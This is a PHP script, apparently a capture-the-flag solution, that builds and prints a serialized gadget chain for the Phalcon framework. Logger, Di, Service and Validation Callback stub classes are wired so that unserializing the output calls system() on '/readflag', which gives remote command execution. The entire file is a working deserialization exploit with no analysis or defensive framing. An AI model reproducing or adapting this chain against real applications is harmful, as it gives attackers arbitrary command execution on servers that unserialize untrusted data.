<?php
    namespace Phalcon\Acl {
        class Component {
            public $name = "/readflag";    // call_user_func:data
        }
    }

    namespace Phalcon\Validation\Validator {
        class Callback {
            public $options = [
                "message" => "",
                "callback" => "system"    // call_user_func:callback
            ];
        }
    }

    namespace Phalcon\Logger\Formatter{
        class Line {
            public $format='%message%';
        }
    }

    namespace Phalcon\Di {
        class Service {
            public $shared = false;
            public $definition;
            public function __construct() {
                $this->definition = [
                    "className" => \Phalcon\Validation::class,
                    "arguments" => [],
                    "calls" => [
                        [
                            "method" => "add",
                            "arguments" => [
                                [
                                    "type" => "parameter",
                                    "value" => [""]
                                ],
                                [
                                    "type" => "parameter",
                                    "value" => new \Phalcon\Validation\Validator\Callback()
                                ]
                            ]
                        ],
                        [
                            "method" => "validate",
                            "arguments" => [
                                [
                                    "type" => "parameter",
                                    "value" => new \Phalcon\Acl\Component()
                                ]
                            ]
                        ]
                    ]
                ];
            }
        }
    }

    namespace Phalcon {
        class Di {
            public $eventsManager = null;
            public $services;
            public function __construct() {
                // lcfirst(substr(method, 3))  method: getName
                $this->services = ["message" => new \Phalcon\Di\Service()];
            }
        }
    }

    namespace Phalcon\Logger\Adapter {
        class Stream {
            public $inTransaction = true;
            public $name = "/tmp/abc";
            public $queue;
            public $formatter;
            public function __construct() {
                $this->formatter = new \Phalcon\Logger\Formatter\Line();
                $this->queue = ["1" => new \Phalcon\Di()];
            }
        }
    }

    namespace {
        echo serialize(new \Phalcon\Logger\Adapter\Stream());
    }
?>